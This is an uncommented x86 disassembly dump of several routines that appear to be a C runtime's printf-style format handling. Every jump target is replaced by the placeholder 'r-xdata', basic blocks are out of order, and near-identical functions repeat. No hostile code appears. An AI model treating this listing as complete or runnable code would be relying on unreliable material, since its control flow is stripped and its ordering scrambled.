movzx eax [ esi + 0x32 ]
cmp eax 0x61
je r-xdata
mov eax [ esi + 0x28 ]
push ebx
push edi
mov ebx 0x15d
lea edi [ esi + 0x40 ]
add eax ebx
mov ecx edi
push eax
call sub_41904b
test al al
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp ax cx
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp eax 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_419019
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp ax dx
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
mov ecx esi
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_41a9e9
test al al
je r-xdata
mov eax edi
pop edi
pop ebx
mov ecx edi
call sub_419019
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
push [ esi + 0x8 ]
movsx eax [ esi + 0x32 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b8d5
push eax
mov ecx edi
call sub_419019
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4354d8
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
test al 0x1
je r-xdata
mov ebx edi
movzx eax [ esi + 0x32 ]
push 0x67
pop ecx
cmp ax cx
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
push 0x47
pop ecx
cmp ax cx
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d908
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d635
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
push 0x73
pop eax
mov [ esi + 0x32 ] ax
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
mov [ esi + 0x38 ] edx
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_424213
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov esi ecx
push 0x67
pop ecx
push 0x47
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
pop edx
test eax eax
jns r-xdata
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp eax 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_41904b
test al al
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp ax cx
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp eax 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_419019
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp ax dx
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_419019
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x32 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b8d5
push eax
mov ecx edi
call sub_419019
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4354d8
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
movzx eax [ esi + 0x32 ]
push 0x67
pop ecx
cmp ax cx
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
push 0x47
pop ecx
cmp ax cx
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d908
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d635
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
push 0x73
pop eax
mov [ esi + 0x32 ] ax
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_424385
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov esi ecx
push 0x67
pop ecx
push 0x47
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
pop edx
test eax eax
jns r-xdata
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp eax 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_41904b
test al al
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp ax cx
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp eax 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_419019
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp ax dx
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_419019
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x32 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b8d5
push eax
mov ecx edi
call sub_419019
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4354d8
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
movzx eax [ esi + 0x32 ]
push 0x67
pop ecx
cmp ax cx
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
push 0x47
pop ecx
cmp ax cx
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d908
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d635
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
push 0x73
pop eax
mov [ esi + 0x32 ] ax
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_4244f7
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
or [ esi + 0x20 ] 0x10
call sub_428213
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_41f3bc
test al al
jne r-xdata
mov eax [ esi + 0x28 ]
push 0x67
pop ecx
push 0x47
pop edx
test eax eax
jns r-xdata
inc al
jmp r-xdata
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp eax 0x61
je r-xdata
mov eax [ esi + 0x28 ]
push ebx
push edi
mov ebx 0x15d
lea edi [ esi + 0x40 ]
add eax ebx
mov ecx edi
push eax
call sub_41904b
test al al
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp ax cx
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp eax 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_419019
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp ax dx
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
mov ecx esi
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_41aa77
test al al
je r-xdata
mov eax edi
pop edi
pop ebx
mov ecx edi
call sub_419019
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
push [ esi + 0x8 ]
movsx eax [ esi + 0x32 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b8d5
push eax
mov ecx edi
call sub_419019
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4354d8
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
test al 0x1
je r-xdata
mov ebx edi
movzx eax [ esi + 0x32 ]
push 0x67
pop ecx
cmp ax cx
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
push 0x47
pop ecx
cmp ax cx
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d908
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d635
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
push 0x73
pop eax
mov [ esi + 0x32 ] ax
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
mov [ esi + 0x38 ] edx
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_424688
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov esi ecx
push 0x67
pop ecx
push 0x47
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
pop edx
test eax eax
jns r-xdata
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp eax 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_41904b
test al al
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp ax cx
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp eax 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_419019
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp ax dx
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_419019
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x32 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b8d5
push eax
mov ecx edi
call sub_419019
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4354d8
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
movzx eax [ esi + 0x32 ]
push 0x67
pop ecx
cmp ax cx
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
push 0x47
pop ecx
cmp ax cx
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d908
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d635
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
push 0x73
pop eax
mov [ esi + 0x32 ] ax
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_42485a
mov edi edi
push esi
mov esi ecx
push edi
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
je r-xdata
mov ecx [ edi + 0x404 ]
test ecx ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push ebx
mov ebx [ edi + 0x404 ]
movzx eax [ eax - 0x4 ]
test ebx ebx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov al [ eax - 0x4 ]
mov [ ecx ] al
mov [ esi + 0x38 ] 0x1
mov ecx edi
push eax
mov ecx edi
call sub_419019
push eax
lea eax [ esi + 0x38 ]
push ebx
push eax
call sub_4342ec
add esp 0x10
pop ebx
test eax eax
je r-xdata
mov ebx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
pop esi
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_4248ea
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push edi
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
test al al
je r-xdata
lea edi [ esi + 0x40 ]
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
xor eax eax
mov ecx esi
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x4 ]
push eax
call sub_41b0f5
test al al
jne r-xdata
push eax
mov ecx esi
call sub_419839
test al al
je r-xdata
mov eax edi
mov ecx esi
call sub_41f37a
test al al
je r-xdata
xor al al
jmp r-xdata
mov ecx esi
call sub_41f37a
test al al
je r-xdata
mov al 0x1
lea edi [ esi + 0x40 ]
push ebx
mov ebx [ edi + 0x404 ]
test ebx ebx
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ esi + 0x38 ] 0x1
push [ ebp - 0x4 ]
mov ecx edi
call sub_419019
push eax
lea eax [ esi + 0x38 ]
push ebx
push eax
call sub_4342ec
add esp 0x10
pop ebx
test eax eax
je r-xdata
mov ebx edi
mov [ esi + 0x34 ] edi
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_4249aa
mov edi edi
push esi
mov esi ecx
push edi
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
je r-xdata
mov ecx [ edi + 0x404 ]
test ecx ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push ebx
mov ebx [ edi + 0x404 ]
movzx eax [ eax - 0x4 ]
test ebx ebx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov al [ eax - 0x4 ]
mov [ ecx ] al
mov [ esi + 0x38 ] 0x1
mov ecx edi
push eax
mov ecx edi
call sub_419019
push eax
lea eax [ esi + 0x38 ]
push ebx
push eax
call sub_4342ec
add esp 0x10
pop ebx
test eax eax
je r-xdata
mov ebx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
pop esi
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424a3a
mov edi edi
push esi
mov esi ecx
push edi
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
je r-xdata
mov ecx [ edi + 0x404 ]
test ecx ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push ebx
mov ebx [ edi + 0x404 ]
movzx eax [ eax - 0x4 ]
test ebx ebx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov al [ eax - 0x4 ]
mov [ ecx ] al
mov [ esi + 0x38 ] 0x1
mov ecx edi
push eax
mov ecx edi
call sub_419019
push eax
lea eax [ esi + 0x38 ]
push ebx
push eax
call sub_4342ec
add esp 0x10
pop ebx
test eax eax
je r-xdata
mov ebx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
pop esi
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424aca
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push edi
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
test al al
je r-xdata
lea edi [ esi + 0x40 ]
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
xor eax eax
mov ecx esi
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x4 ]
push eax
call sub_41b177
test al al
jne r-xdata
push eax
mov ecx esi
call sub_4198b7
test al al
je r-xdata
mov eax edi
mov ecx esi
call sub_41f390
test al al
je r-xdata
xor al al
jmp r-xdata
mov ecx esi
call sub_41f390
test al al
je r-xdata
mov al 0x1
lea edi [ esi + 0x40 ]
push ebx
mov ebx [ edi + 0x404 ]
test ebx ebx
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ esi + 0x38 ] 0x1
push [ ebp - 0x4 ]
mov ecx edi
call sub_419019
push eax
lea eax [ esi + 0x38 ]
push ebx
push eax
call sub_4342ec
add esp 0x10
pop ebx
test eax eax
je r-xdata
mov ebx edi
mov [ esi + 0x34 ] edi
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424b8a
mov edi edi
push esi
mov esi ecx
push edi
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
je r-xdata
mov ecx [ edi + 0x404 ]
test ecx ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push ebx
mov ebx [ edi + 0x404 ]
movzx eax [ eax - 0x4 ]
test ebx ebx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov al [ eax - 0x4 ]
mov [ ecx ] al
mov [ esi + 0x38 ] 0x1
mov ecx edi
push eax
mov ecx edi
call sub_419019
push eax
lea eax [ esi + 0x38 ]
push ebx
push eax
call sub_4342ec
add esp 0x10
pop ebx
test eax eax
je r-xdata
mov ebx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
pop esi
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424c1a
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ esi + 0x3c ] 0x1
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push [ esi + 0x2c ]
movzx ebx [ eax - 0x4 ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
jne r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx [ edi + 0x404 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] al
test ecx ecx
jne r-xdata
mov [ eax ] bx
mov eax edi
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_434030
add esp 0x10
test eax eax
jns r-xdata
mov ecx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424cb2
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
xor eax eax
mov esi ecx
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x4 ]
push eax
mov [ esi + 0x3c ] 0x1
call sub_41b1f9
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx esi
call sub_41f3a6
test al al
je r-xdata
mov al 0x1
movzx eax [ esi + 0x32 ]
push edi
push [ esi + 0x2c ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
lea edi [ esi + 0x40 ]
mov ecx [ edi + 0x404 ]
test al al
jne r-xdata
test ecx ecx
jne r-xdata
mov al [ ebp - 0x4 ]
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] 0x0
test ecx ecx
jne r-xdata
mov ax [ ebp - 0x4 ]
mov [ ecx ] ax
mov ecx edi
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_434030
add esp 0x10
test eax eax
jns r-xdata
mov ecx edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] 0x1
pop edi
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424d61
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ esi + 0x3c ] 0x1
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push [ esi + 0x2c ]
movzx ebx [ eax - 0x4 ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
jne r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx [ edi + 0x404 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] al
test ecx ecx
jne r-xdata
mov [ eax ] bx
mov eax edi
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_434030
add esp 0x10
test eax eax
jns r-xdata
mov ecx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424df9
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ esi + 0x3c ] 0x1
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push [ esi + 0x2c ]
movzx ebx [ eax - 0x4 ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
jne r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx [ edi + 0x404 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] al
test ecx ecx
jne r-xdata
mov [ eax ] bx
mov eax edi
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_434030
add esp 0x10
test eax eax
jns r-xdata
mov ecx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424e91
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
xor eax eax
mov esi ecx
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x4 ]
push eax
mov [ esi + 0x3c ] 0x1
call sub_41b27b
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx esi
call sub_41f3bc
test al al
je r-xdata
mov al 0x1
movzx eax [ esi + 0x32 ]
push edi
push [ esi + 0x2c ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
lea edi [ esi + 0x40 ]
mov ecx [ edi + 0x404 ]
test al al
jne r-xdata
test ecx ecx
jne r-xdata
mov al [ ebp - 0x4 ]
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] 0x0
test ecx ecx
jne r-xdata
mov ax [ ebp - 0x4 ]
mov [ ecx ] ax
mov ecx edi
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_434030
add esp 0x10
test eax eax
jns r-xdata
mov ecx edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] 0x1
pop edi
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424f40
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ esi + 0x3c ] 0x1
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push [ esi + 0x2c ]
movzx ebx [ eax - 0x4 ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b5c5
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
jne r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx [ edi + 0x404 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] al
test ecx ecx
jne r-xdata
mov [ eax ] bx
mov eax edi
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_434030
add esp 0x10
test eax eax
jns r-xdata
mov ecx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_425080
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
